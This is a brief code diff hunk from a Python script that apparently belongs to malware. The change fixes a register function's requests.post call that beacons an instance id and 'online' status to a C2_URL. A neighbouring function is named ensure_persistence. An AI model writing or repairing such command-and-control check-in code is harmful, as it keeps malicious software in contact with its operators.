@@ -35,7 +35,7 @@ def ensure_persistence():
 
 def register():
     try:
-        requests.post(C2_URL, json={"instance_id": "shard-" + str(os.getpid()), "status": "online"}, 0)
+        requests.post(C2_URL, json={"instance_id": "shard-" + str(os.getpid()), "status": "online"})
     except: pass
 
 if __name__ == "__main__":
